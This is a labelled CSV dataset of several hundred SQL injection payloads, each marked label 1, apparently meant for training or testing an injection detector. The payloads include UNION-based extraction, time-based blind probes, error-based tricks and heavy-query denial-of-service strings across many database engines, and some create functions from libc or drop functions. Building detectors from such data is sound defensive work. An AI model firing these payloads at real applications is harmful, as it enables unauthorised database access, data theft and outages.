payload,label
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",1
-3136%') or 3400=6002,1
1) where 7956=7956 or sleep(5)#,1
-7387'))) order by 1--,1
1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,1
"1))) union all select null,null,null#",1
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",1
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",1
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",1
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",1
-2604)) as sekb where 6897=6897 or 1000=7683,1
"1%""))) waitfor delay '0:0:5'--",1
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",1
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,1
"1%"");select benchmark(5000000,md5(0x714e4153))#",1
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""",1
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",1
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",1
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,1
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",1
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",1
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1
1'+(select 'gmpn' where 8137=8137 or sleep(5))+',1
"-4182)) as wkfh where 6145=6145 union all select 6145,6145,6145,6145,6145#",1
"1"" union all select null#",1
"1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1' where 8584=8584 order by 1#,1
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
1')) as plbt where 4368=4368 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,1
1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#,1
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs",1
"1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",1
"1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1%"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",1
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),1
"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""abcw""=""abcw",1
"1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='",1
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('njge' like 'njge,1
"1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""gfwz""=""gfwz",1
"1)) as pjjz where 8384=8384 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
"1%"")) order by 1#",1
1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
-6165%')) union all select 5384#,1
"1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
"1) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1
"-2122"") as zytb where 7025=7025 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--",1
1) as imdt where 6431=6431;begin user_lock.sleep(5); end--,1
1')) as eltx where 9955=9955 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (6518=6518,1
1'||(select 'mosp' where 6085=6085;waitfor delay '0:0:5'--,1
"1') where 1093=1093 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""%""=""",1
"-6789'||(select 'uckz' from dual where 2163=2163 union all select 2163,2163,2163,2163,2163,2163--",1
"-6108') union all select 2519,2519,2519,2519--",1
1) where 3979=3979 rlike sleep(5)--,1
-8143) union all select 3014--,1
"-9954"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""bifi""=""bifi",1
1') where 6624=6624 and 5392=8258,1
"-3884"" where 8012=8012 union all select 8012,8012#",1
"1%"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""%""=""",1
"1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"1"") where 2834=2834 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1
"1) where 9371=9371 union all select null,null,null,null,null,null,null--",1
"1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1"") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--",1
-9336' or 5641=9488#,1
"-3205"") union all select 5233,5233,5233,5233#",1
1') rlike (select * from (select(sleep(5)))vwyq)#,1
"1"") where 7548=7548;select sleep(5)--",1
1';(select * from (select(sleep(5)))srmq),1
1'));select case when 2095=9074 then 1 else null end--,1
"1%"")) rlike (select * from (select(sleep(5)))vwyq)#",1
1' where 4134=4134 and 1102=6300--,1
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('kmjn'='kmjn",1
"-5800"") or 6872=6872 and (""tcab"" like ""tcab",1
"-6599"")) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",1
"(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",1
'1,1
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
"1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#",1
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('vjnf' like 'vjnf",1
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""hsaw""=""hsaw",1
1 where 2382=2382;(select * from (select(sleep(5)))acdk)#,1
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja",1
"1%"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",1
1'||(select 'puco' where 2605=2605 union all select null#,1
1%')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',1
"make_set(5679=9769,9769)",1
"-2333' union all select 9714,9714,9714--",1
"1"") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--",1
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'yaje'='yaje",1
1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--,1
"1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"-1197"")) as dfsy where 8857=8857 or 3038=3038",1
"1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",1
"1"") as fkco where 8877=8877 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
"1')) union all select null,null,null,null,null--",1
1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',1
1))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((4694=4694,1
"1"") where 5197=5197 and elt(3114=3114,sleep(5))#",1
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",1
1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
"-2518' union all select 6818,6818,6818,6818,6818,6818#",1
"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""",1
"1;select count(*) from generate_series(1,5000000)-- gqkk",1
"1'||(select 'wqmz' where 6400=6400 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'",1
-3938%'))) or 2034=7209#,1
"1%')) union all select null,null,null#",1
1) where 5866=5866 and 4595=4595#,1
1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk,1
"1',(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))",1
-1629'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('tezf'='tezf,1
"-7868"" union all select 1805--",1
1'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#,1
1));begin user_lock.sleep(5); end and ((6874=6874,1
"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",1
"1%"") or elt(5873=5873,sleep(5))#",1
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl",1
"1""))) and 7533=7533 and (((""alvd"" like ""alvd",1
"1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
1'));(select * from (select(sleep(5)))acdk)#,1
"1') as ildf where 5545=5545 union all select null,null,null,null#",1
' or '1' = '1,1
-3752%' union all select 9351--,1
"1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
1%');if(7899=7899) select 7899 else drop function zbbp--,1
1' where 3188=3188 and 9198=9198--,1
"-4954%"") or 5244=4832",1
1'))) and 3602=1990#,1
"-7142')) union all select 5083,5083,5083,5083#",1
"-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--",1
"-9532)) union all select 6039,6039,6039,6039--",1
1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,1
"1%"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1
"1') where 3476=3476 and elt(1210=1210,sleep(5))--",1
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('nuil' like 'nuil",1
-9100) or 8792=9550--,1
"-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270",1
"1' in boolean mode);select count(*) from generate_series(1,5000000)#",1
1'))) and (1685=2985)*2985 and ((('rzwb'='rzwb,1
"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon",1
"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--",1
"1,(select (case when (3743=9640) then 1 else 3743*(select 3743 from master..sysdatabases) end))",1
"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""",1
"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",1
"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",1
1%' or (select * from (select(sleep(5)))sddo)#,1
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm,1
1) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--,1
"1') and 3824=benchmark(5000000,md5(0x76555642))",1
"1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--",1
"-3963"" or 1224=5119",1
1)) as cwyb where 3633=3633;select (case when (3681=5026) then 3681 else 3681*(select 3681 from information_schema.character_sets) end)#,1
-1354)) or 8571=8571--,1
"1' where 3612=3612 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1
"1"")) as zgig where 5748=5748 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1' in boolean mode) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",1
"1'||(select 'yags' where 6268=6268 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",1
"1%"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1%'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('%'='",1
"1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",1
"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"-7324) or make_set(8486=6544,6544)",1
"1') as gxpb where 7107=7107 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",1
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# kkmw",1
1 and 6969=(select 6969 from pg_sleep(5))-- yczq,1
"1%""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",1
"1"")) as eagr where 3366=3366 and elt(4249=4249,7259)--",1
"1"" where 6023=6023;if(1928=4811) select 1928 else drop function ucko--",1
"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip",1
"1""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('qtfl'='qtfl",1
"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
"-9606 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# iuij",1
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"1 where 9279=9279 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1
"1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='",1
"1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--",1
"1'))) union all select null,null,null--",1
"-4319"") where 7534=7534 or 8246=3217",1
"1) where 9724=9724 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1
1'));begin user_lock.sleep(5); end--,1
"1%' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and '%'='",1
"1%') union all select null,null,null,null,null,null--",1
"-8929%') union all select 9486,9486,9486,9486#",1
"1') as asjj where 1721=1721 union all select null,null,null,null,null,null--",1
"-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",1
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr",1
"-1139) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln",1
"1') where 4750=4750 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1
1))) and 9198=9198--,1
-4339) where 7178=7178 or 4008=7232,1
"1')) as ytfi where 3323=3323 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
1')));select (case when (5768=9169) then 5768 else 1/(select 0) end)--,1
"1' where 3125=3125 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1
"1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""zoag"" like ""zoag",1
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('kyos' like 'kyos",1
"1%"");select pg_sleep(5)--",1
"1)) as midl where 9046=9046 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",1
"-9313%"") or 5971=4572#",1
"-1083%""))) or elt(1032=1032,3623) and (((""%""=""",1
"-6093') where 9676=9676 union all select 9676,9676,9676,9676,9676,9676--",1
"-3179'+(select 'tzzz' where 3191=3191 union all select 3191,3191,3191,3191,3191#",1
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""yxes"" like ""yxes",1
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('frpo' like 'frpo",1
1' where 9583=9583 and 5319=7670#,1
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""=""",1
"1"")));if(8727=4039) select 8727 else drop function giql--",1
"1"" and sleep(5)#",1
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",1
"1""))) or elt(5873=5873,sleep(5))#",1
"1'+(select pdfv where 1172=1172 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))+'",1
"1)) or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
"-3672"")) union all select 6093#",1
"1%""))) rlike sleep(5) and (((""%""=""",1
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'fjfo'='fjfo",1
"1%')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('%'='",1
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('gfll'='gfll",1
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('ossj'='ossj",1
"1"") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
"1"")) and 7656=5604 and ((""zuhv""=""zuhv",1
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('nlnk' like 'nlnk",1
"1 where 4944=4944 union all select null,null,null,null,null,null,null,null,null#",1
1%') or sleep(5)#,1
"1'+(select unzl where 3432=3432 union all select null,null,null,null--",1
"1,iif(1440=4612,1,1/0)",1
"-9111"" or 3038=3038",1
"1%'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('%'='",1
"-7258 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1
1)));select case when 7717=7717 then 1 else null end--,1
"1%'));iif(5257=5257,1,1/0)",1
"1%""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",1
"1%')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1
"1%"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"1 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
1') and 7290=8416 and ('ktlz' like 'ktlz,1
1%' or 4240=(select 4240 from pg_sleep(5))--,1
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
"-7940%"") union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",1
"-1692') union all select 7074,7074,7074,7074,7074,7074,7074#",1
-5116) or (8287=4930)*4930,1
"1"")) as ubrg where 7318=7318 and 7331=6529--",1
"-5539"") union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",1
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""%""=""",1
"1) as hvsk where 7902=7902;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
1') as jlae where 1650=1650;begin user_lock.sleep(5); end--,1
-3859) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (5846=5846,1
"1%""))) union all select null,null,null,null,null,null,null,null,null--",1
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",1
"1)) as xroy where 3274=3274;iif(3760=4785,1,1/0)",1
"1%"";begin user_lock.sleep(5); end and ""%""=""",1
"1'||(select 'mzsy' where 4940=4940 or elt(5873=5873,sleep(5))#",1
"iif(2976=2976,1,1/0)",1
"1' union all select null,null,null#",1
"1',(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",1
"1' union all select null,null,null,null,null--",1
"1"");(select * from (select(sleep(5)))acdk)#",1
"1))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1
"-1204')) union all select 3585,3585--",1
"1"") and (3020=3020)*6703 and (""qowc"" like ""qowc",1
"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",1
"1') where 5925=5925 union all select null,null,null,null,null,null,null#",1
"-2248'+(select wuow where 4421=4421 union all select 4421,4421,4421,4421,4421,4421--",1
1;waitfor delay '0:0:5',1
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'lxqz'='lxqz",1
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",1
"1' or 8156=(select count(*) from generate_series(1,5000000))--",1
"1')));select count(*) from generate_series(1,5000000) and ((('wvzw'='wvzw",1
"1'+(select hspl where 4530=4530 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('crkz'='crkz",1
"-1270'||(select 'mgdi' where 6785=6785 union all select 6785,6785#",1
1')));select pg_sleep(5)--,1
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)-- pvdw",1
"1'+(select 'qzcx' where 9524=9524 and elt(3069=8430,8430))+'",1
"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
"1%""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",1
"-7776') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ihof'='ihof",1
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
1')) as pdcl where 6964=6964;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
"-5317')) union all select 7673,7673,7673,7673,7673,7673#",1
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
"1'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1'))) union all select null,null,null,null,null,null,null,null,null,null#",1
"1')) and elt(6847=5874,5874) and (('yspu'='yspu",1
1%') and (7704=3494)*3494 and ('%'=',1
-7663')) or 1558=1104 and (('wsrq'='wsrq,1
"-9996' or make_set(1237=7111,7111)",1
"1""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""pnsz"" like ""pnsz",1
"-6453"")) as hehs where 9363=9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",1
"-5728) where 8663=8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",1
1' and 7533=7533 and 'clqy' like 'clqy,1
"1%') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('%'='",1
